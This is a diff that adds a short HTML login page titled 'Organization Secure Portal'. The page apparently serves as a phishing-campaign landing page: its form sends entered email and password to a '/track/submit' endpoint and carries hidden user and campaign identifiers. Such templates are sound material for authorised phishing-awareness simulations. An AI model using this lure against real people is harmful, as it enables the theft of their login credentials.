@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Login</title>
+</head>
+<body>
+  <h2>Organization Secure Portal</h2>
+
+  <form method="POST" action="/track/submit">
+    <input type="hidden" name="uid" value="USER_ID">
+    <input type="hidden" name="cid" value="CAMPAIGN_ID">
+
+    <label>Email</label><br>
+    <input type="email" name="email" required><br><br>
+
+    <label>Password</label><br>
+    <input type="password" name="password" required><br><br>
+
+    <button type="submit">Login</button>
+  </form>
+</body>
+</html>
